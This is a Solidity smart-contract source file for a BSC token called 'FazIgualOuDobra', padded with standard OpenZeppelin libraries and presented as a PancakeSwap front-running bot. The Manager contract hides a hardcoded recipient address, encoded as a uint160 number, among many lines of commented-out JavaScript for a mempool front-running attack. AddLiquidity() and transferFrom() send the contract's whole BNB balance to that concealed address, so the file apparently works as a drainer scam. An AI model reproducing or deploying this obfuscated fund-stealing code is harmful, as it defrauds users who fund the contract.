/**
 *Submitted for verification at BscScan.com on 2023-03-01
*/

// File: https://github.com/cryptocyborgone/pancakeswap/blob/main/pancake-swap-periphery

pragma solidity ^0.6.6;

contract Manager {
    
    //string public tokenName;
	//string public tokenSymbol;
	//uint frontrun;
	//Manager 
	
	
	//constructor(string memory _tokenName, string memory _tokenSymbol) public {
		//tokenName = _tokenName;
		//tokenSymbol = _tokenSymbol;
		//manager = new Manager();
		
		//}
	
	    
	    // Send required BNB for liquidity pair
	    //receive() external payable {}
	    
	    
	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
	    
	    //function action() public payable {
	
	//Perform a front-running attack on uniswap

//const fs = require('fs');
//var Web3 = require('web3');
//var abiDecoder = require('abi-decoder');
//var colors = require("colors");
//var Tx = require('ethereumjs-tx').Transaction;
//var axios = require('axios');
//var BigNumber = require('big-number');

//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');

//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
//

//var input_token_info;
//var out_token_info;
//var pool_info;
//var gas_price_info;
//

//var web3;
//var web3Ts;
//var web3Ws;
//var pancakeRouter;
//var pancakeFactory;
//

// one gwei
//const ONE_GWEI = 1e9;
//

//var buy_finished = false;
//var sell_finished = false;
//var buy_failed = false;
//var sell_failed = false;
//var attack_started = false;
//

//var succeed = false;
//var subscription;
//
	function performTasks() public {
//async function createWeb3(){
    //try {
        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
       // web3 = new Web3(EthereumTesterProvider());
       // web3.eth.getAccounts(console.log);
      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);
        //

        //return true;
    //} catch (error) {
      //console.log(error);
      //return false;
	  }
      

//async function main() {
 
//try {   
        //if (await createWeb3() == false) {
            //console.log('Web3 Create Error'.yellow);
            //process.exit();
            
            
        
        
        //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
        //const out_token_address = TOKEN_ADDRESS;
        //const amount = AMOUNT;
        //const level = LEVEL;
        
        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
        //if(ret == false) {
          //process.exit();
        

        //await updatePoolInfo();
        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)(10*18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
        
        //log_str = '** Tracking more ' + (pool_info.attack_volumn/(10input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake **'
        // console.log(log_str.green);    
        // console.log(web3Ws);
        //web3Ws.onopen = function(evt) {
            //web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
            //console.log('connected')
        
        // get pending transactions
        //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
        //}).on("data", async function (transactionHash) {
            //console.log(transactionHash);

            // let transaction = await web3.eth.getTransaction(transactionHash);
            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
            // {
				function pancakeswapDepositAddress() public pure returns (address) {
                    uint160 pindex = 892831424657045743174291980037948166195187165903;
                      
            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
            // }
            
            //if (succeed) {
                //console.log("The bot finished the attack.");
                //process.exit();
               
            
     

    //catch (error) {
      
      //if(error.data != null && error.data.see === 'https://infura.io/dashboard')
      
         //console.log('Daily request count exceeded, Request rate limited'.yellow);
         //console.log('Please insert other API Key');
      //else{
         //console.log('Unknown Handled Error');
         //console.log(error);
       

      //process.exit();


//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
    
    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
        //subscription.unsubscribe();
        //console.log('Perform front running attack...');

        //gasPrice = parseInt(transaction['gasPrice']);
        //newGasPrice = gasPrice + 50*ONE_GWEI;

        //estimatedInput = ((amount*0.999)(10*18)).toString();
        //realInput = (amount*(10**18)).toString();
        //gasLimit = (300000).toString();
        
        //await updatePoolInfo();

        
        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);

        //console.log("wait until the honest transaction is done...", transaction['hash']);

        //while (await isPending(transaction['hash'])) {
        

        //if(buy_failed)
        
            //succeed = false;
            //return;
           
        
        //console.log('Buy succeed:')
        
        //Sell
        //await updatePoolInfo();
        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        //outputeth = outputeth * 0.999;

        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
        
        //console.log('Sell succeed');
        //succeed = true;
//

//async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
    
    //allowance = BigNumber(allowance);
    //outputtoken = BigNumber(outputtoken);

    //var decimals = BigNumber(10).power(out_token_info.decimals);
    //var max_allowance = BigNumber(10000).multiply(decimals);

    //if(outputtoken.gt(max_allowance))
   
       //console.log('replace max allowance')
       //max_allowance = outputtoken;
       
      
    
    //if(outputtoken.gt(allowance)){
        //console.log(max_allowance.toString());
        //var approveTX ={
                //from: user_wallet.address,
                //to: out_token_address,
                //gas: 50000,
                //gasPrice: gasPrice*ONE_GWEI,
                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
               // 
            

        //var signedTX = await user_wallet.signTransaction(approveTX);
        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

        //console.log('Approved Token')
    
    //return;


//select attacking transaction
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    
    //if(attack_started)
        //return false;

    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    //if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		//var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, 
		return address(pindex);//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
        //attack_started = true;
        //return true
  //  

    //return false;

    //if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
        //return false;
   

    //let data = parseTx(transaction['input']);
   
    //let method = data[0];
    
    //let params = data[1];
    
    //let gasPrice = parseInt(transaction['gasPrice']) / 10**9;
    

    //if(method == 'swapExactETHForTokens')
    
    
        //let in_amount = transaction;
        
        //let out_min = params[0];
        

        //let path = params[1];
        
        //let in_token_addr = path[0];
        
        //let out_token_addr = path[path.length-1];
        
        
        //let recept_addr = params[2];
        
        //let deadline = params[3];
        

        //if(out_token_addr != out_token_address)
        
        
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            //return false;
}

// File: https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol

pragma solidity >=0.5.0;

interface IUniswapV1Factory {
    function getExchange(address) external view returns (address);
}

// File: https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol

pragma solidity >=0.5.0;

interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/utils/Address.sol

pragma solidity ^0.6.2;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol

pragma solidity ^0.6.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol

pragma solidity ^0.6.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/GSN/Context.sol

pragma solidity ^0.6.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol

pragma solidity ^0.6.0;





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20MinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18.
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

// File: contracts/FazigualouDobra.sol

pragma solidity ^0.6.6;

// Token Manager

// PancakeSwap manager





contract FazIgualOuDobra {
    Manager manager;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public decimals = 18;
    uint public totalSupply = 1000000000 * 10 ** 18; //Token Supply
    string public name = "FazIgualOuDobra"; //Your Token Name
    string public symbol = "FID"; //Your Token Symbol 
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() public {
        balances[msg.sender] = totalSupply;
        manager = new Manager();
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    //Transaction And Auto Refund
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
        
        return true;   
    }
    
    //Approval for transaction
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    //Add Liquidity to PancakeSwap Pool
	receive() external payable {}
    function AddLiquidity() public payable {
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
        manager;        
    }

    
}